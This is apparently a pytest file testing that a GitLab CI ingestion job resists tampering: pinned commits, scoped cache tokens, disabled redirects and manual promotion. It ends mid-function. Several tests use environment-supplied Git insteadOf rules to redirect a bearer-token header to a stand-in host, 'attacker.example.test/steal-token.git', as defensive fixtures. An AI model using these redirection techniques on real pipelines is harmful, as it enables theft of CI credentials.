# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""The internal GitLab job definition keeps its safety properties (it is never executed here)."""

import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

pytestmark = pytest.mark.unit

JOB = Path(__file__).resolve().parents[5] / "scripts/ci/gitlab/aisim-infx-ingest.gitlab-ci.yml"


class UniqueKeyLoader(yaml.SafeLoader):
    def construct_mapping(self, node, deep=False):
        keys = set()
        for key_node, _ in node.value:
            key = self.construct_object(key_node, deep=deep)
            if key in keys:
                raise yaml.constructor.ConstructorError(
                    "while constructing a mapping", node.start_mark, f"duplicate key: {key}", key_node.start_mark
                )
            keys.add(key)
        return super().construct_mapping(node, deep=deep)


def test_definition_parser_rejects_duplicate_keys():
    with pytest.raises(yaml.constructor.ConstructorError, match="duplicate key: script"):
        yaml.load("job:\n  script: first\n  script: second\n", Loader=UniqueKeyLoader)


@pytest.fixture(scope="module")
def definition():
    spec, definition = yaml.load_all(JOB.read_text(), Loader=UniqueKeyLoader)
    inputs = spec["spec"]["inputs"]
    assert inputs["job"]["default"] == "ingest"
    assert inputs["job"]["options"] == ["ingest", "promote", "staleness"]
    assert inputs["candidate-snapshot-id"]["regex"] == "^([0-9a-f]{64})?$"
    assert inputs["candidate-commit"]["regex"] == "^([0-9a-f]{40}|[0-9a-f]{64})?$"
    return definition


def _text(job):
    return "\n".join(str(line) for line in job.get("script", []))


def test_runs_only_on_schedule_or_manual_and_is_pinned(definition):
    assert {r.get("if") for r in definition["workflow"]["rules"] if "if" in r} == {
        '$CI_PIPELINE_SOURCE == "schedule"',
        '$CI_PIPELINE_SOURCE == "web"',
    }
    pinned = "\n".join(definition[".pinned"]["before_script"])
    assert "AISIM_REVIEWED_COMMIT" in pinned and "-eq 40" in pinned and "rev-parse HEAD" in pinned


@pytest.mark.parametrize("job", ["publish_candidate", "promote", "staleness"])
@pytest.mark.parametrize("installation", ["unconfigured", "pin-only", "ready"])
def test_reviewed_trust_values_cannot_be_overridden_at_pipeline_or_manual_job_entry(
    definition, tmp_path, job, installation
):
    # Installing the definition edits reviewed literals, never the process environment.
    pin = "a" * 40
    cache_url = "https://cache.example.test/approved/aisim-infx-cache.git"
    selector = {"publish_candidate": "ingest", "promote": "promote", "staleness": "staleness"}[job]
    setup = "\n".join(definition[".pinned"]["before_script"]).replace("$[[ inputs.job ]]", selector)
    if installation != "unconfigured":
        setup = setup.replace("REPLACE_WITH_REVIEWED_40_HEX_AISIM_COMMIT", pin)
    if installation == "ready":
        setup = setup.replace("REPLACE_WITH_APPROVED_HTTPS_CACHE_REPO_URL", cache_url)
    assert definition[job]["extends"] == ".pinned"
    clone = next(line for line in definition[job]["script"] if "clone -q --depth 1" in line)
    clone = clone.replace("$[[ inputs.candidate-snapshot-id ]]", "b" * 64).replace(
        "$[[ inputs.candidate-generation ]]", "42"
    )
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    git = bin_dir / "git"
    git.write_text(
        f"#!{sys.executable}\n"
        "import json, os, sys\n"
        "from pathlib import Path\n"
        "with (Path(os.environ['CI_PROJECT_DIR']) / 'git-calls.jsonl').open('a') as log:\n"
        "    log.write(json.dumps(sys.argv[1:]) + '\\n')\n"
        f"if sys.argv[1:] == ['rev-parse', 'HEAD']: print({pin!r})\n"
    )
    git.chmod(0o755)
    uv = bin_dir / "uv"
    uv.write_text('#!/bin/sh\n[ "${INFX_CACHE_WRITE_TOKEN+x}" != x ] && [ "${INFX_CACHE_READ_TOKEN+x}" != x ]\n')
    uv.chmod(0o755)
    result = subprocess.run(
        [
            "sh",
            "-eu",
            "-c",
            setup
            + "\ntest \"$JOB_PY\" = 'uv run --frozen --project aisim/python/aisim python -m aisim_core.data.infx_job'\n"
            + clone,
        ],
        cwd=tmp_path,
        env={
            **os.environ,
            "PATH": f"{bin_dir}:{os.environ['PATH']}",
            "CI_PROJECT_DIR": str(tmp_path),
            "INFX_JOB": selector,
            # These represent higher-precedence pipeline or manual-job variables.
            "AISIM_REVIEWED_COMMIT": "c" * 40,
            "AISIM_REPO_URL": "https://attacker.example.test/unreviewed.git",
            "INFX_CACHE_REPO_URL": "https://attacker.example.test/steal-token.git",
            "JOB_PY": "unreviewed-command",
            "INFX_CACHE_WRITE_TOKEN": "synthetic-writer",
            "INFX_CACHE_READ_TOKEN": "synthetic-reader",
        },
        capture_output=True,
        text=True,
    )
    log = tmp_path / "git-calls.jsonl"
    if installation != "ready":
        assert result.returncode != 0
        assert not log.exists()  # Pipeline values cannot turn an unconfigured template into a runnable job.
        return
    assert result.returncode == 0, result.stderr
    calls = [json.loads(line) for line in log.read_text().splitlines()]
    assert ["remote", "add", "origin", "https://github.com/ai-dynamo/aisim.git"] in calls
    assert ["fetch", "-q", "--depth", "1", "origin", pin] in calls
    cache_clone = calls[-1]
    assert cache_clone[-2:] == [cache_url, "cache-repo"]
    token = "synthetic-reader" if job == "staleness" else "synthetic-writer"
    assert f"http.extraHeader=Authorization: Bearer {token}" in cache_clone
    assert "http.followRedirects=false" in cache_clone
    assert "attacker.example.test" not in json.dumps(calls)


def _guard(definition, job="ingest"):
    """The first setup block: Git's environment configuration is dropped and the job selector is checked."""
    return definition[".pinned"]["before_script"][0].replace("$[[ inputs.job ]]", job)


APPROVED = "https://cache.example.test/approved/aisim-infx-cache.git"
ATTACKER = "https://attacker.example.test/"


@pytest.mark.skipif(shutil.which("git") is None, reason="needs a real git to resolve URLs")
@pytest.mark.parametrize("channel", ["count-empty-value", "count", "parameters", "global-file"])
def test_environment_git_configuration_cannot_rewrite_the_token_destination(definition, tmp_path, channel):
    """Real Git URL resolution: a variable-supplied insteadOf rule must not change where the token header goes."""
    (tmp_path / "home").mkdir()
    attack = {
        "count-empty-value": {  # an empty insteadOf matches every URL
            "GIT_CONFIG_COUNT": "1",
            "GIT_CONFIG_KEY_0": f"url.{ATTACKER}.insteadOf",
            "GIT_CONFIG_VALUE_0": "",
        },
        "count": {
            "GIT_CONFIG_COUNT": "1",
            "GIT_CONFIG_KEY_0": f"url.{ATTACKER}.insteadOf",
            "GIT_CONFIG_VALUE_0": "https://cache.example.test/",
        },
        "parameters": {"GIT_CONFIG_PARAMETERS": f"'url.{ATTACKER}.insteadof=https://cache.example.test/'"},
        "global-file": {"GIT_CONFIG_GLOBAL": str(tmp_path / "attacker-config")},
    }[channel]
    (tmp_path / "attacker-config").write_text(f'[url "{ATTACKER}"]\n\tinsteadOf = https://cache.example.test/\n')
    env = {
        **{k: v for k, v in os.environ.items() if not k.startswith("GIT_")},
        "HOME": str(tmp_path / "home"),
        "XDG_CONFIG_HOME": str(tmp_path / "home"),
        "GIT_CONFIG_NOSYSTEM": "1",
        "INFX_JOB": "ingest",
        **attack,
    }
    resolve = f"git ls-remote --get-url {APPROVED}"

    def run(script):
        return subprocess.run(
            ["sh", "-eu", "-c", script], cwd=tmp_path, env=env, capture_output=True, text=True, check=True
        ).stdout.strip()

    assert ATTACKER in run(resolve)  # without the guard, Git really sends the URL elsewhere
    assert run(_guard(definition) + "\n" + resolve) == APPROVED


@pytest.mark.parametrize("job", ["publish_candidate", "promote", "staleness"])
def test_every_job_drops_git_environment_configuration_before_any_git_command(definition, job):
    # The guard is the first setup block of the shared pinned template, ahead of the checkout's git commands.
    assert definition[job]["extends"] == ".pinned" and "before_script" not in definition[job]
    first, second = definition[".pinned"]["before_script"][:2]
    assert "unset" in first and "GIT_CONFIG" in first
    assert "git init" in second and "git init" not in first


@pytest.mark.parametrize(
    ("selector", "accepted"), [("ingest", True), ("staleness", False), ("promote", False), ("", False), (None, False)]
)
def test_a_pipeline_variable_cannot_replace_the_validated_job_selector(definition, tmp_path, selector, accepted):
    env = {k: v for k, v in os.environ.items() if k != "INFX_JOB"}
    if selector is not None:
        env["INFX_JOB"] = selector
    result = subprocess.run(
        ["sh", "-eu", "-c", _guard(definition, "ingest")], cwd=tmp_path, env=env, capture_output=True, text=True
    )
    assert (result.returncode == 0) is accepted, result.stderr
    if not accepted:
        assert result.returncode == 2 and "INFX_JOB differs from the job input" in result.stderr


@pytest.mark.parametrize("configuration", ["environment", "parameters", "global", "system", "template"])
@pytest.mark.parametrize(
    "job,operation",
    [
        ("publish_candidate", "clone"),
        ("promote", "clone"),
        ("staleness", "clone"),
        ("publish_candidate", "ls-remote"),
        ("publish_candidate", "fetch"),
        ("publish_candidate", "push"),
        ("promote", "fetch"),
        ("promote", "push"),
    ],
)
def test_inherited_git_configuration_cannot_redirect_cache_credentials(
    definition, tmp_path, configuration, job, operation
):
    cache_url = "https://cache.example.test/approved/aisim-infx-cache.git"
    attacker_url = "https://attacker.example.test/steal-token.git"
    token = "synthetic-reader" if job == "staleness" else "synthetic-writer"
    header = f"Authorization: Bearer {token}"
    env = {key: value for key, value in os.environ.items() if not key.startswith("GIT_")}
    env.update({"GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull})
    source = tmp_path / "source"
    subprocess.run(["git", "init", "-q", str(source)], env=env, check=True)
    identity = ["-c", "user.name=Synthetic Fixture", "-c", "user.email=fixture@example.test"]
    subprocess.run(
        ["git", "-C", str(source), *identity, "commit", "-qm", "fixture", "--allow-empty"], env=env, check=True
    )
    pin = subprocess.check_output(["git", "-C", str(source), "rev-parse", "HEAD"], env=env, text=True).strip()

    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    log = tmp_path / "transport.jsonl"
    # Real Git resolves insteadOf and propagates -c headers before starting this
    # transport helper. Only HTTPS I/O is replaced; all credentials are synthetic.
    helper = bin_dir / "git-remote-https"
    helper.write_text(
        f"#!{sys.executable}\n"
        "import json, os, subprocess, sys\n"
        "headers = subprocess.check_output(['git', 'config', '--get-all', 'http.extraHeader'], text=True)\n"
        "with open(os.environ['GIT_TRANSPORT_LOG'], 'a') as log:\n"
        "    log.write(json.dumps({'url': sys.argv[2], 'headers': headers.splitlines()}) + '\\n')\n"
        "sys.exit(1)\n"
    )
    helper.chmod(0o755)
    uv = bin_dir / "uv"
    uv.write_text('#!/bin/sh\n[ "${INFX_CACHE_WRITE_TOKEN+x}" != x ] && [ "${INFX_CACHE_READ_TOKEN+x}" != x ]\n')
    uv.chmod(0o755)
    env.update(
        {
            "PATH": f"{bin_dir}:{os.environ['PATH']}",
            "GIT_EXEC_PATH": str(bin_dir),
            "GIT_TRANSPORT_LOG": str(log),
            "CI_PROJECT_DIR": str(tmp_path),
            "INFX_CACHE_WRITE_TOKEN": "synthetic-writer",
            "INFX_CACHE_READ_TOKEN": "synthetic-reader",
            "REF": "refs/heads/fixture",
            "BRANCH": "fixture",
            "SID": "b" * 64,
        }
    )
    key = f"url.{attacker_url}.insteadOf"
    control_root = tmp_path
    if configuration == "environment":
        env.update({"GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": key, "GIT_CONFIG_VALUE_0": cache_url})
    elif configuration == "parameters":
        env["GIT_CONFIG_PARAMETERS"] = f"'{key}={cache_url}'"
    else:
        config = tmp_path / "template" / "config"
        config.parent.mkdir()
        config.write_text(f'[url "{attacker_url}"]\n\tinsteadOf = {cache_url}\n')
        if configuration == "template":
            env["GIT_TEMPLATE_DIR"] = str(config.parent)
            control_root = tmp_path / "unisolated"
            subprocess.run(["git", "init", "-q", str(control_root)], env=env, check=True)
        else:
            env[f"GIT_CONFIG_{configuration.upper()}"] = str(config)

    # Positive control: this real Git invocation sends the header to the rewritten
    # transport destination unless the job's configuration isolation runs first.
    result = subprocess.run(
        ["git", "-c", f"http.extraHeader={header}", "ls-remote", cache_url],
        env=env,
        cwd=control_root,
        capture_output=True,
    )
    assert result.returncode != 0  # the offline transport deliberately stops here
    assert [json.loads(line) for line in log.read_text().splitlines()] == [{"url": attacker_url, "headers": [header]}]
    log.unlink()

    # The setup's first block also checks that INFX_JOB equals the job input the pipeline was started with.
    selector = {"publish_candidate": "ingest"}.get(job, job)
    env["INFX_JOB"] = selector
    setup = "\n".join(definition[".pinned"]["before_script"]).replace("$[[ inputs.job ]]", selector)
    setup = (
        setup.replace("REPLACE_WITH_REVIEWED_40_HEX_AISIM_COMMIT", pin)
        .replace("REPLACE_WITH_APPROVED_HTTPS_CACHE_REPO_URL", cache_url)
        .replace("https://github.com/ai-dynamo/aisim.git", source.as_uri())
    )
    if operation == "clone":
        command = next(line for line in definition[job]["script"] if "clone -q --depth 1" in line)
        command = command.replace("$[[ inputs.candidate-snapshot-id ]]", "b" * 64).replace(
            "$[[ inputs.candidate-generation ]]", "42"
        )
    else:
        # A real local cache checkout supplies origin and a pushable ref. The
        # command under test still comes directly from the reviewed job script.
        setup += (
            "\ngit init -q -b fixture cache-repo\n"
            'git -C cache-repo remote add origin "$INFX_CACHE_REPO_URL"\n'
            'git -C cache-repo -c user.name="Synthetic Fixture" -c user.email=fixture@example.test '
            "commit -qm fixture --allow-empty\n"
        )
        match = "ls-remote --heads" if operation == "ls-remote" else f"{operation} -q "
        command = next(line.strip() for line in _text(definition[job]).splitlines() if match in line)
        if job == "publish_candidate" or operation == "push":
            setup += "cd cache-repo\n"
    result = subprocess.run(
        ["sh", "-eu", "-c", setup + "\n" + command], env=env, cwd=tmp_path, capture_output=True, text=True
    )
    assert result.returncode != 0  # only the offline transport should fail
    assert log.exists(), result.stderr
    assert [json.loads(line) for line in log.read_text().splitlines()] == [{"url": cache_url, "headers": [header]}]


def test_ingestion_runs_without_the_cache_token_and_never_pushes_to_the_default_branch(definition):
    job = definition["publish_candidate"]
    text = _text(job)
    assert "env -u INFX_CACHE_WRITE_TOKEN" in text and 'push -q origin "$BRANCH"' in text
    assert 'BRANCH="candidate/${SID}-${CI_JOB_ID}"' in text
    assert '[ "$RC" -ne 3 ]' in text  # a verifier that cannot run never allows a replacement push
    assert "main" not in text and "unchanged refresh: no commit" in text and "git status --porcelain" in text
    assert "$JOB_PY promote" not in text
    assert job["resource_group"] == "infx-cache-candidate-publication"


@pytest.mark.parametrize("status", [0, 73])
def test_publication_status_failure_cannot_look_unchanged(definition, tmp_path, status):
    git = tmp_path / "git"
    git.write_text(
        "#!/bin/sh\n"
        'case "$*" in\n'
        "  'rev-parse HEAD') echo base ;;\n"
        f"  'status --porcelain') exit {status} ;;\n"
        "  *ls-remote*) printf 'base\\tHEAD\\n' ;;\n"
        "  *) exit 99 ;;\n"
        "esac\n"
    )
    git.chmod(0o755)
    (tmp_path / "cache-repo").mkdir()
    result = subprocess.run(
        ["sh", "-eu", "-c", definition["publish_candidate"]["script"][-1]],
        cwd=tmp_path,
        env={**os.environ, "PATH": f"{tmp_path}:{os.environ['PATH']}", "INFX_CACHE_WRITE_TOKEN": ""},
        capture_output=True,
        text=True,
    )
    assert result.returncode == status
    assert ("unchanged refresh" in result.stdout) is (status == 0)


def test_qualification_process_does_not_inherit_write_token(definition, tmp_path):
    command = next(line for line in definition["promote"]["script"] if "$JOB_PY promote" in line)
    command = command.replace("$[[ inputs.candidate-snapshot-id ]]", "a" * 64)
    tool = tmp_path / "job-python"
    tool.write_text('#!/bin/sh\ntest "$1" = promote\n[ "${INFX_CACHE_WRITE_TOKEN+x}" != x ]\n')
    tool.chmod(0o755)
    subprocess.run(
        ["sh", "-eu", "-c", command],
        cwd=tmp_path,
        check=True,
        env={**os.environ, "JOB_PY": str(tool), "INFX_CACHE_WRITE_TOKEN": "synthetic", "GITLAB_USER_NAME": "reviewer"},
    )


def test_promotion_is_manual_with_a_named_reviewer_and_staleness_is_alert_only(definition):
    assert [r["when"] for r in definition["promote"]["rules"]] == ["manual"]
    assert '--reviewer "$GITLAB_USER_NAME"' in _text(definition["promote"])
    assert definition["staleness"]["allow_failure"] == {"exit_codes": [10, 11]}


def test_failure_alert_job_exists(definition):
    alert = definition["alert_failure"]
    assert alert["when"] == "on_failure" and alert["stage"] == "notify"
    assert "needs" not in alert and "extends" not in alert and "before_script" not in alert
    assert "AISIM_REPO_URL" not in _text(alert) and "JOB_PY" not in _text(alert)
    rules = " ".join(r["if"] for r in alert["rules"])
    assert '$INFX_JOB == "staleness"' in rules and '$INFX_JOB == "ingest"' in rules


def test_ci_contract_clean_workspace_default_pipelines_and_staleness_status(definition):
    assert definition["variables"]["GIT_STRATEGY"] == "empty"
    rules = " ".join(r["if"] for r in definition["publish_candidate"]["rules"])
    assert '$INFX_JOB == "ingest"' in rules and "== null" not in rules and "!=" not in rules  # promote never acquires
    assert "ls-remote --heads origin" in _text(definition["publish_candidate"])
    assert "||" not in _text(definition["staleness"])  # unexpected statuses must fail the job


def test_staleness_only_uses_the_read_credential(definition):
    assert "INFX_CACHE_READ_TOKEN" in _text(definition["staleness"])
    assert "INFX_CACHE_WRITE_TOKEN" not in _text(definition["staleness"])
    for name in ("publish_candidate", "promote"):
        assert definition[name]["environment"] == {"name": "infx-cache-writer", "action": "access"}
        assert "INFX_CACHE_READ_TOKEN" not in _text(definition[name])
    # The read token is scoped to its own environment, so no other job inherits it.
    assert definition["staleness"]["environment"] == {"name": "infx-cache-reader", "action": "access"}
    assert "environment" not in definition["alert_failure"]


def test_staleness_cli_cannot_read_the_cache_read_token(definition, tmp_path):
    command = next(line for line in definition["staleness"]["script"] if "$JOB_PY staleness" in line)
    tool = tmp_path / "job-python"
    tool.write_text('#!/bin/sh\ntest "$1" = staleness\n[ "${INFX_CACHE_READ_TOKEN+x}" != x ]\n')
    tool.chmod(0o755)
    subprocess.run(
        ["sh", "-eu", "-c", command],
        cwd=tmp_path,
        check=True,
        env={**os.environ, "JOB_PY": str(tool), "INFX_CACHE_READ_TOKEN": "synthetic"},
    )


def test_dependency_setup_cannot_read_either_cache_token(definition, tmp_path):
    setup = "\n".join(definition[".pinned"]["before_script"])
    sync = next(line.strip() for line in setup.splitlines() if "uv sync" in line)
    uv = tmp_path / "uv"
    uv.write_text('#!/bin/sh\n[ "${INFX_CACHE_WRITE_TOKEN+x}" != x ] && [ "${INFX_CACHE_READ_TOKEN+x}" != x ]\n')
    uv.chmod(0o755)
    env = {
        **os.environ,
        "PATH": f"{tmp_path}:{os.environ['PATH']}",
        "INFX_CACHE_WRITE_TOKEN": "synthetic",
        "INFX_CACHE_READ_TOKEN": "synthetic",
    }
    subprocess.run(["sh", "-eu", "-c", sync], env=env, cwd=tmp_path, check=True)


def test_job_commands_do_not_resolve_new_dependencies(definition):
    setup = "\n".join(definition[".pinned"]["before_script"])
    assignment = next(line.strip() for line in setup.splitlines() if line.strip().startswith("readonly JOB_PY="))
    command = shlex.split(shlex.split(assignment)[1].split("=", 1)[1])
    assert command[:3] == ["uv", "run", "--frozen"]
    assert command[command.index("--project") + 1] == "aisim/python/aisim"


def test_all_authenticated_git_commands_disable_redirects(definition):
    setup = "\n".join(definition[".pinned"]["before_script"])
    for name in ("publish_candidate", "promote", "staleness"):
        for line in (setup + "\n" + _text(definition[name])).splitlines():
            if "http.extraHeader=" in line:
                assert "-c http.followRedirects=false" in line, line


@pytest.mark.parametrize("slack_fails", [False, True])
@pytest.mark.parametrize("has_report", [False, True])
def test_failure_notification_works_without_repository_fetch(
    definition, monkeypatch, tmp_path, slack_fails, has_report
):
    import json
    import smtplib
    import urllib.request

    for key, value in {
        "CI_PIPELINE_URL": "https://ci.example.test/pipeline/1",
        "AISIM_REPO_URL": "/unavailable-repository",
        "SLACK_WEBHOOK_URL": "https://alerts.example.test/hook",
        "SMTP_HOST": "smtp.example.test",
        "SMTP_FROM": "bot@example.test",
        "AISIM_JOB_OWNER_EMAIL": "owner@example.test",
    }.items():
        monkeypatch.setenv(key, value)
    monkeypatch.chdir(tmp_path)
    if has_report:
        (tmp_path / "run-report.json").write_text(json.dumps({"status": "failed", "error": "structured fixture error"}))
    delivered = []

    class Response:
        def close(self):
            pass

    def slack(request, timeout):
        assert ("structured fixture error" in json.loads(request.data)["text"]) is has_report
        delivered.append("slack")
        if slack_fails:
            raise OSError("fixture Slack failure")
        return Response()

    class SMTP:
        def __init__(self, *a, **k):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *a):
            pass

        def send_message(self, message):
            assert message["To"] == "owner@example.test" and "pipeline/1" in message.get_content()
            assert ("structured fixture error" in message.get_content()) is has_report
            delivered.append("mail")

    monkeypatch.setattr(urllib.request, "urlopen", slack)
    monkeypatch.setattr(smtplib, "SMTP", SMTP)
    script = _text(definition["alert_failure"]).split("python3 - <<'PY'\n", 1)[1].rsplit("\nPY", 1)[0]
    with pytest.raises(SystemExit) as exc:
        exec(compile(script, "gitlab-notification", "exec"), {})
    assert exc.value.code == int(slack_fails) and delivered == ["slack", "mail"]


def test_ci_ingestion_defers_failure_alerts_to_the_fallback(definition):
    assert "run --no-notify" in _text(definition["publish_candidate"])
    assert "run-report.json" in _text(definition["alert_failure"])
    assert definition["publish_candidate"]["artifacts"]["when"] == "always"


@pytest.mark.parametrize(
    "source,selector,expected",
    [
        ("schedule", "ingest", {"publish_candidate", "alert_failure"}),
        ("schedule", "staleness", {"staleness", "alert_failure"}),
        ("schedule", "promote", set()),
        ("web", "ingest", {"publish_candidate", "alert_failure"}),
        ("web", "promote", {"promote", "alert_failure"}),
        ("web", "staleness", {"alert_failure"}),
        ("push", "ingest", set()),
    ],
)
def test_selector_rules_use_gitlab_variable_comparisons_and_route_jobs(definition, source, selector, expected):
    assert definition["variables"]["INFX_JOB"] == "$[[ inputs.job ]]"
    variables = {"CI_PIPELINE_SOURCE": source, "INFX_JOB": selector}
    selected = set()
    # This definition uses GitLab's documented variable-left string equality
    # subset. Validate the complete expression, then exercise its routing table.
    comparison = r'\$([A-Z_]+)\s*==\s*"([^"]*)"'
    for name in ("publish_candidate", "promote", "staleness", "alert_failure"):
        for rule in definition[name]["rules"]:
            parts = rule["if"].split(" && ")
            matches = [re.fullmatch(comparison, part) for part in parts]
            assert all(matches), rule["if"]
            if all(variables[m[1]] == m[2] for m in matches):
                selected.add(name)
                break
    assert selected == expected


@pytest.mark.parametrize(
    "kind",
    [
        "historical",
        "different-baseline",
        "pending",
        "generated-pending",
        "damaged-pending",
        "ignored-artifact",
        "baseline-moved",
        "baseline-moved-pending",
    ],
)
def test_recurring_snapshot_keeps_historical_reviews_and_reuses_only_current_pending(definition, tmp_path, kind):
    from aisim_core.data.infx_job import run_ingestion
    from tests.unit.data.test_infx_ingest import NOW, FakeInfx

    payload = tmp_path / "payload"
    payload.mkdir()
    result = run_ingestion(payload, tmp_path / "acquisition", transport=FakeInfx(), now=lambda: NOW)
    assert result.status == "candidate"
    sid = result.snapshot_id
    qualified_a = {
        "snapshot_id": sid,
        "snapshot_path": f"snapshots/{sid}/snapshot.json",
        "created_at": "2026-11-01T00:00:00Z",
        "qualified_at": "2026-11-01T00:00:00Z",
        "reviewer": "reviewer",
    }
    qualified_b = {**qualified_a, "snapshot_id": "b" * 64, "snapshot_path": f"snapshots/{'b' * 64}/snapshot.json"}
    pending = {
        "snapshot_id": sid,
        "snapshot_path": f"snapshots/{sid}/snapshot.json",
        "created_at": "2026-11-19T00:00:00Z",
    }
    schema = "aisim-infx-ingestion-state/v1"

    local_git_keys = {
        "GIT_DIR",
        "GIT_WORK_TREE",
        "GIT_COMMON_DIR",
        "GIT_INDEX_FILE",
        "GIT_OBJECT_DIRECTORY",
        "GIT_ALTERNATE_OBJECT_DIRECTORIES",
        "GIT_PREFIX",
        "GIT_SHALLOW_FILE",
        "GIT_GRAFT_FILE",
        "GIT_IMPLICIT_WORK_TREE",
        "GIT_REPLACE_REF_BASE",
        "GIT_NO_REPLACE_OBJECTS",
        "GIT_CONFIG",
        "GIT_CONFIG_PARAMETERS",
        "GIT_CONFIG_COUNT",
    }
    git_env = {
        key: value
        for key, value in os.environ.items()
        if key not in local_git_keys and not key.startswith(("GIT_CONFIG_KEY_", "GIT_CONFIG_VALUE_"))
    }
    # Synthetic fixture commits never need a signing key, even when the developer enables signing globally.
    git_env.update({"GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "commit.gpgsign", "GIT_CONFIG_VALUE_0": "false"})

    def git(path, *args):
        return subprocess.check_output(
            [
                "git",
                "-C",
                str(path),
                "-c",
                "user.name=Synthetic Fixture",
                "-c",
                "user.email=fixture@example.test",
                *args,
            ],
            text=True,
            env=git_env,
        ).strip()

    remote = tmp_path / "remote.git"
    subprocess.run(["git", "init", "--bare", "-q", "-b", "main", str(remote)], check=True, env=git_env)
    seed = tmp_path / "seed"
    seed.mkdir()
    git(seed, "init", "-qb", "main")

    def commit_state(qualified, candidate):
        (seed / "ingestion-state.json").write_text(
            json.dumps({"schema_version": schema, "qualified": qualified, "candidate": candidate})
        )
        git(seed, "add", "-A")
        git(seed, "commit", "-qm", "synthetic state")

    if kind == "ignored-artifact":  # an ignore rule in the cache repository silently drops a required shard file
        (seed / ".gitignore").write_text("metrics.parquet\n")
    commit_state(qualified_b, None)
    git(seed, "remote", "add", "origin", str(remote))
    git(seed, "push", "-q", "origin", "main")
    branch = f"candidate/{sid}" + ("-17" if kind == "generated-pending" else "")
    git(seed, "checkout", "-qb", branch)
    for name in ("revisions", "snapshots"):
        shutil.copytree(payload / name, seed / name)
    if kind == "damaged-pending":
        damaged = next(seed.rglob("metrics.parquet"))
        missing = damaged.relative_to(seed).as_posix()
        damaged.unlink()
    commit_state(qualified_b if "pending" in kind else qualified_a, None if kind == "historical" else pending)
    git(seed, "push", "-q", "origin", branch)
    old = git(remote, "rev-parse", branch)

    workspace = tmp_path / "work"
    workspace.mkdir()
    subprocess.run(
        ["git", "clone", "-q", "--branch", "main", str(remote), str(workspace / "cache-repo")], check=True, env=git_env
    )
    (workspace / "cache-repo/ingestion-state.json").write_text(
        json.dumps({"schema_version": schema, "qualified": qualified_b, "candidate": pending})
    )
    for name in ("revisions", "snapshots"):
        shutil.copytree(payload / name, workspace / "cache-repo" / name)
    (workspace / "run-report.json").write_text(json.dumps({"snapshot_id": sid}))
    if kind.startswith("baseline-moved"):  # another qualification lands on the default branch during acquisition
        git(seed, "checkout", "-q", "main")
        (seed / "moved").write_text("a later qualification\n")
        git(seed, "add", "-A")
        git(seed, "commit", "-qm", "default branch moved")
        git(seed, "push", "-q", "origin", "main")
    # Exercise the publication shell and real verification library offline.
    # Only uv's already-installed interpreter selection is replaced here.
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    uv = bin_dir / "uv"
    uv.write_text(
        "#!/bin/sh\n"
        'test "$1" = run && test "$2" = --frozen && test "$3" = --project && test "$5" = python || exit 2\n'
        "shift 5\n"
        f'exec {shlex.quote(sys.executable)} "$@"\n'
    )
    uv.chmod(0o755)
    script = definition["publish_candidate"]["script"][-1]
    result = subprocess.run(
        ["sh", "-eu", "-c", script],
        cwd=workspace,
        env={
            **git_env,
            "PATH": f"{bin_dir}:{os.environ['PATH']}",
            "CI_JOB_ID": "42",
            "INFX_CACHE_WRITE_TOKEN": "",
        },
        capture_output=True,
        text=True,
    )
    assert git(remote, "rev-parse", branch) == old
    branches = git(remote, "for-each-ref", "--format=%(refname:short)", "refs/heads").splitlines()
    new_branch = f"candidate/{sid}-42"
    if kind.startswith("baseline-moved"):
        # A moved baseline fails the job, even where the pending branch would otherwise be reused.
        assert result.returncode == 4 and "default branch moved" in result.stderr
        assert new_branch not in branches
        return
    if kind == "ignored-artifact":
        # The ignored shard file is missing from the commit: nothing may be pushed.
        assert result.returncode != 0 and "missing dataset artifact" in result.stderr
        assert new_branch not in branches
        return
    assert result.returncode == 0, result.stderr
    if kind in ("pending", "generated-pending"):
        assert new_branch not in branches
    else:
        assert new_branch in branches
        state = json.loads(git(remote, "show", f"{new_branch}:ingestion-state.json"))
        assert state["qualified"] == qualified_b and state["candidate"]["snapshot_id"] == sid
        if kind == "damaged-pending":
            git(remote, "cat-file", "-e", f"{new_branch}:{missing}")
            assert not (seed / missing).exists()


@pytest.mark.parametrize("generation", ["", "42"])
def test_promotion_selects_the_reviewed_candidate_generation(definition, tmp_path, generation):
    # Execute the clone command with a fake git to observe the exact branch;
    # promotion must push back to that same branch, preserving historical refs.
    script = next(line for line in definition["promote"]["script"] if "GENERATION=" in line)
    script = script.replace("$[[ inputs.candidate-snapshot-id ]]", "a" * 64).replace(
        "$[[ inputs.candidate-generation ]]", generation
    )
    git = tmp_path / "git"
    git.write_text('#!/bin/sh\nprintf "%s\\n" "$@" > clone-args\n')
    git.chmod(0o755)
    subprocess.run(
        ["sh", "-eu", "-c", script],
        cwd=tmp_path,
        env={
            **os.environ,
            "PATH": f"{tmp_path}:{os.environ['PATH']}",
            "INFX_CACHE_WRITE_TOKEN": "",
            "INFX_CACHE_REPO_URL": "synthetic",
        },
        check=True,
    )
    args = (tmp_path / "clone-args").read_text().splitlines()
    assert args[args.index("--branch") + 1] == "candidate/" + "a" * 64 + (f"-{generation}" if generation else "")
    assert "HEAD:refs/heads/${BRANCH}" in _text(definition["promote"])


@pytest.mark.parametrize("reviewed", [True, False])
def test_promotion_qualifies_only_the_reviewed_candidate_commit(definition, tmp_path, reviewed):
    block = next(
        line for line in definition["promote"]["script"] if "candidate branch tip is not the reviewed commit" in line
    )
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update({"GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "commit.gpgsign", "GIT_CONFIG_VALUE_0": "false"})

    def git(path, *args):
        identity = ["-c", "user.name=Synthetic Fixture", "-c", "user.email=fixture@example.test"]
        return subprocess.check_output(["git", "-C", str(path), *identity, *args], text=True, env=env).strip()

    remote = tmp_path / "remote.git"
    subprocess.run(["git", "init", "--bare", "-q", "-b", "main", str(remote)], check=True, env=env)
    seed = tmp_path / "seed"
    seed.mkdir()
    git(seed, "init", "-qb", "main")
    (seed / "default.txt").write_text("default branch\n")
